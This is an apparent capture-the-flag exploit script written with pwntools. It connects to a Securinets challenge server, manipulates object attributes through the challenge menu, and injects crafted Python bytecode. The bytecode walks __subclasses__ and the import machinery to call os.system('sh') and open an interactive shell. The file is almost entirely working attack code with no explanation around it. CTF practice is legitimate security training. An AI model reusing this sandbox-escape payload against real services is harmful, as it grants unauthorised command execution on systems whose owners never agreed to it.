from pwn import *

r = remote("pwn.ctf.securinets.tn", 4009) # process(['python3.10', 'main.py']) # 


opcode = "g\\x00j\\x00j\\x01\\xa0\\x02\\xa1\\x00}\\x00" + \
         "|\\x00d\\x01\\x19\\x00|\\x00d\\x02\\x19\\x00g\\x02t\\x03_\\x04" + \
         "i\\x00t\\x03_\\x06" + \
         "|\\x00d\\x03\\x19\\x00\\xa0\\x05|\\x00d\\x04\\x19\\x00\\xa0\\x02\\xa1\\x00d\\x00\\x19\\x00d\\x05g\\x01f\\x02\\xa1\\x01g\\x01t\\x03_\\x07" + \
         "d\\x06g\\x01t\\x03_\\x08" + \
         "d\\x00d\\x00l\\t" + \
         "\\xa0\\n" + \
         "d\\x07" + \
         "\\xa1\\x01" 
args = "(1,0,0,6,4,0,b'%s',(0,104,121,122,118,'.py','/usr/lib/python3.10','sh'),('__class__','__base__','__subclasses__','sys','meta_path','path_hook','path_importer_cache','path_hooks','path','os','system'), ('x',),'','',35,b'\\x0c\\x01\\x12\\x01\\x08\\x01\\x10\\x01\\x10\\x02\\x06\\x01\\x08\\x01\\x08\\x01\\x08\\x01\\x0e\\x01',(),())" % (opcode,)


def cd(path):
    r.sendline(b"1")
    r.sendline(path)


cd(b"__del__")
cd(b"__code__")
cd(b"__class__")

r.sendline(b"2") # save

r.sendline(b"5") # reset

cd(b"__class__")
cd(b"__del__")

r.sendline(b"3")
r.sendline(args.encode())

r.sendline(b"4")
r.sendline(b"__code__")

r.sendline(b"6")
r.interactive()

